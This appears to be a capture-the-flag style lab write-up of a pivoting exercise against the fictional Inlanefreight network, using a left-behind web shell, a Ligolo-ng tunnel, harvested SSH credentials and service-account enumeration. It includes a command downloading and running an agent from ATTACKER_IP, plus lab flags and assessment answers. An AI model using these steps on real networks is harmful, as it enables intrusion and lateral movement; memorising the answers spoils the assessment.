# Skills Assessment

## Context
> A team member started a Penetration Test against the Inlanefreight environment but was moved to another project. They left a **web shell** in place for us to continue. We need to leverage the web shell to enumerate hosts, identify services, and pivot through internal networks until we reach the **Inlanefreight Domain Controller**.

## Objectives
- [x] Access the first system via the web shell
- [x] Enumerate and pivot to an internal host
- [ ] Continue pivoting until reaching the Domain Controller
- [x] Capture flags along the way
- [x] Use data, credentials, scripts found in the environment

## Starting Point
- **External Access:** Web shell at `10.129.75.160` (IP changed after restart)
- **Target Environment:** Inlanefreight internal network
- **Goal:** Domain Controller flag

## Target Map

```
[External]
    |
    v
[10.129.75.160] ← Web Shell (www-data)
    |
    | Ligolo-ng tunnel → 172.16.0.0/16
    v
[172.16.5.15] — Web shell internal NIC
    |
    | SSH (mlefay creds)
    v
[172.16.5.35] — PIVOT-SRV01 (Admin!)
    |
    | Second NIC: 172.16.6.35
    v
[172.16.6.0/16] — Next hop network (Domain Controller?)
    |
    v
[Domain Controller] ← Final target / Flag
```

---

## Phase 1: Web Shell Enumeration

**Web Shell Found:** `p0wny@shell` on port 80
- **URL:** `http://10.129.75.160`
- **User:** `www-data`
- **OS:** Ubuntu (Apache 2.4.41)

### Credentials Discovered
**File:** `/home/webadmin/for-admin-eyes-only`
```
# note to self,
in order to reach server01 or other servers in the subnet from here
you have to us the user account: mlefay
with a password of: Plain Human work!
```

| Question | Answer |
|----------|--------|
| Q1: What user's directory contains credentials? | `webadmin` |
| Q2: Credentials found | `mlefay:Plain Human work!` |

---

## Phase 2: Ligolo-ng Tunnel Setup

**From webshell host (www-data reverse shell):**
```bash
# Download and run ligolo-ng agent
wget http://ATTACKER_IP:8080/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect ATTACKER_IP:11601 -ignore-cert
```

**On attack box (ligolo proxy):**
```bash
ligolo-ng -bind 0.0.0.0:11601
session                    # select agent
sudo ip route add 172.16.0.0/16 dev ligolo
```

**Route added:** `172.16.0.0/16 dev ligolo`

---

## Phase 3: Internal Network Discovery

**Host Discovery:**
```bash
# Ping sweep through tunnel
for i in $(seq 1 254); do
    (ping -c 1 -W 1 172.16.5.$i | grep "bytes from" &)
done
```

**Results:**
- `172.16.5.15` — Web shell host (internal NIC)
- `172.16.5.35` — PIVOT-SRV01

| Question | Answer |
|----------|--------|
| Q3: Active internal host discovered | `172.16.5.15` (or `172.16.5.35` as next target) |

---

## Phase 4: Pivot to PIVOT-SRV01

**SSH from attack box (via ligolo tunnel):**
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null mlefay@172.16.5.35
# Password: Plain Human work!
```

**Connection successful!**
```
mlefay@PIVOT-SRV01 C:\Users\mlefay>
```

### PIVOT-SRV01 Enumeration

| Property | Value |
|----------|-------|
| **Hostname** | PIVOT-SRV01 |
| **Domain** | INLANEFREIGHT.LOCAL |
| **OS** | Windows Server 2019 Standard |
| **NIC 1** | 172.16.5.35 |
| **NIC 2** | 172.16.6.35 ← New network! |
| **User** | mlefay |
| **Privileges** | BUILTIN\Administrators |

**Groups:**
- BUILTIN\Administrators ✅
- BUILTIN\Remote Desktop Users
- BUILTIN\Users

**Open Ports:**
- 22/tcp — OpenSSH for Windows
- 135/tcp — MSRPC
- 139/tcp — NetBIOS
- 445/tcp — SMB
- 3389/tcp — RDP
- 5985/tcp — WinRM

### Flag Captured ✅

```powershell
type C:\Flag.txt
```
**Flag:** `S1ngl3-Piv07-3@sy-Day`

| Question | Answer |
|----------|--------|
| Q4: Flag on discovered host | `S1ngl3-Piv07-3@sy-Day` |

---

## Phase 5: Service Account Enumeration (Question 5)

**Services running as domain accounts:**
```powershell
wmic service get name,startname | findstr "INLANEFREIGHT"
```

**Results:**
```
DHCPServer     INLANEFREIGHT\vfrank
SCardSvr       INLANEFREIGHT\vfrank
```

| Question | Answer |
|----------|--------|
| Q5: Vulnerable service account user | `vfrank` |

---

## Phase 6: Next Hop — 172.16.6.0/16

PIVOT-SRV01 has a **second NIC** on `172.16.6.35`. This is the path to the Domain Controller.

**Plan:**
1. Extend ligolo-ng tunnel through PIVOT-SRV01 to reach 172.16.6.0/16
2. Scan for Domain Controller
3. Use `vfrank` credentials (if extractable) or other pivot technique
4. Capture final flags

| Question | Status |
|----------|--------|
| Q6: Flag on workstation | ⏳ Pending |
| Q7: Flag on Domain Controller | ⏳ Pending |

---

## Credentials Discovered

| Account | Password | Source | Valid On |
|---------|----------|--------|----------|
| `mlefay` | `Plain Human work!` | `/home/webadmin/for-admin-eyes-only` | SSH to 172.16.5.35 |
| `INLANEFREIGHT\vfrank` | *(extractable via service)* | `wmic service` | Domain account |

---

## Pivot Map (Updated)

```
[External Attacker]
    |
    | HTTP → Web Shell
    v
[10.129.75.160] — www-data (p0wny@shell)
    |
    | Ligolo-ng agent → proxy
    v
[172.16.5.15] — Web shell internal NIC
    |
    | SSH (mlefay:Plain Human work!)
    v
[172.16.5.35] — PIVOT-SRV01 (Admin)
    |   |
    |   | Second NIC
    |   v
    | [172.16.6.0/16] — Next network
    |   |
    |   v
    | [Domain Controller] — Final target
    |
    | Flag: S1ngl3-Piv07-3@sy-Day ✅
```

---

## Lessons Learned

1. **Web shells are gold** — Previous team member left p0wny@shell, instant access
2. **Read all files** — `for-admin-eyes-only` literally contained credentials
3. **Ligolo-ng for Linux pivoting** — Agent runs on webshell host, proxy on attack box, route added for internal network
4. **SSH through tunnels** — Once ligolo route is active, SSH from attack box as if local
5. **Windows services expose domain accounts** — `wmic service get name,startname` reveals `INLANEFREIGHT\vfrank`
6. **Multi-NIC servers = network bridge** — PIVOT-SRV01 connects 172.16.5.x and 172.16.6.x
7. **Bash ping sweep over tunnels can be noisy** — Use `ip neigh` / `arp -a` on the foothold host instead
8. **Nmap -sn through tunnels gives false positives** — ICMP doesn't translate well; use TCP port scans instead

---

*Started: 2026-04-23*
*Updated: 2026-04-23 11:26 UTC+8*
*Status: 🔄 IN PROGRESS — PIVOT-SRV01 compromised, extending tunnel to 172.16.6.0/16*
*Flags: 1/3 captured ✅*
